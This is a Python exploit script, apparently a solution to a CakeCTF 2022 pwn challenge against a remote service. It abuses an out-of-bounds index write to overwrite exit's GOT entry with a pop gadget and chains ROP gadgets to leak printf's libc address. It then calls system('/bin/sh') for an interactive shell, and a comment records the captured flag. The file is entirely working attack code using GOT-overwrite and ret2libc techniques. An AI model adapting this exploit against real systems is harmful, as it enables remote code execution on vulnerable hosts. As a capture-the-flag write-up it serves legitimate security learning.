#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn1.2022.cakectf.com', 'port':9002})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_plt        = binf.sep_section['.got.plt']

addr_got_exit       = binf.got['exit']
addr_got_printf     = binf.got['printf']

addr_pop4           = 0x4013dc    # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_printf      = libc.sep_function['printf']

#==========

def attack(conn, **kwargs):
    conn.sendlineafter(b'size: ', b'5')
    write(conn, 4, 100)

    rop = ROP(binf)
    rop.printf(addr_got_printf)
    rop.raw(rop.ret)
    rop.main()
    rb = bytes(rop)
    ra = [u64(rb[i:i+8]) for i in range(0, len(rb), 8)]

    write(conn,  3, addr_pop4)
    for i in range(len(ra)):
        write(conn,  8+i, ra[i])

    write(conn,  6, addr_got_plt)
    write(conn, (addr_got_exit-addr_got_plt)//8, addr_pop4)
    conn.sendlineafter(b'index: ', b'-1')

    addr_libc_printf = u(conn.recv(6))
    libc.address = addr_libc_printf - offset_libc_printf
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    conn.sendlineafter(b'size: ', b'5')
    write(conn, 4, 100)

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)
    rb = bytes(rop)
    ra = [u64(rb[i:i+8]) for i in range(0, len(rb), 8)]

    write(conn,  3, addr_pop4)
    for i in range(len(ra)):
        write(conn,  8+i, ra[i])

    conn.sendlineafter(b'index: ', b'-1')

def write(conn, idx, v):
    conn.sendlineafter(b'index: ', str(idx).encode())
    conn.sendlineafter(b'value: ', str(v).encode())

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # CakeCTF{PRE01-C. Use parentheses within macros around parameter names}

if __name__=='__main__':
    main()

#==========
